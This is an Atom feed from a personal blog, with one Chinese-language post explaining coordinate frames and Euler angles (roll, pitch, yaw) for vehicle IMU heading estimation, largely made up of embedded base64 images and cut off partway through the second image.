<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Kaibro's blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://w181496.twbbs.org/"/>
  <updated>2017-07-03T19:41:14.000Z</updated>
  <id>http://w181496.twbbs.org/</id>
  
  <author>
    <name><![CDATA[KaiBro]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[座標系、歐拉角與方位角]]></title>
    <link href="http://w181496.twbbs.org/2017/07/04/%E5%BA%A7%E6%A8%99%E7%B3%BB%E3%80%81%E6%AD%90%E6%8B%89%E8%A7%92%E8%88%87%E6%96%B9%E4%BD%8D%E8%A7%92/"/>
    <id>http://w181496.twbbs.org/2017/07/04/座標系、歐拉角與方位角/</id>
    <published>2017-07-03T16:50:11.000Z</published>
    <updated>2017-07-03T19:41:14.000Z</updated>
    <content type="html"><![CDATA[<p>此篇文章為我在研究利用車載IMU判斷行進方向並預防事故的一些技術資料整理及個人理解。<br>可能在學術上不是很嚴謹，也有可能有地方有錯誤。<br>名詞定義上也可能和其他學術論文不同。</p>
<h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p><strong><em> IMU(Inertial measurement unit): 慣性測量單元 </em></strong><br> IMU包含加速度計、磁力計、陀螺儀等sensor<br> 而IMU被包進後照鏡中，掛在車子上<br> 目的是希望車子行進時，可以計算出車子的方向或是其他資訊來幫助後續處理</p>
<a id="more"></a>
<h2 id="u5EA7_u6A19_u7CFB"><a href="#u5EA7_u6A19_u7CFB" class="headerlink" title="座標系"></a>座標系</h2><p> 所謂座標系，像我們高中數學、物理所學的直角座標系、慣性座標系也是座標系的一種<br> 而這裡我們主要討論的是「地球座標系」</p>
<p> <strong><em> 地球座標系(Earth Frame) </em></strong><br> 這裡的地球座標系，指的是x軸指向北方，y軸指向東方，z軸指向地心的座標系<br> 所以在地球座標系上，重力加速度平行z軸，且垂直xy平面<br> (xy平面即為水平面)</p>
<p><img src="data:image/png;base64,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" alt="test"></p>
<p> <strong><em> 載體座標系(Body Frame) </em></strong><br>  載體座標系在這裡指的是，相對於車子的座標系<br>  例如：車子行進方向為x軸，左右方向為y軸，垂直兩者的為z軸<br>  而在車上的物體就能以此座標系來表示<br>  一般都將Sensor Frame簡化成Body Frame</p>
<h2 id="u6B50_u62C9_u89D2"><a href="#u6B50_u62C9_u89D2" class="headerlink" title="歐拉角"></a>歐拉角</h2><p>歐拉角分為三種角度：roll、pitch、yaw</p>
<p><img src="data:image/jpeg;base64,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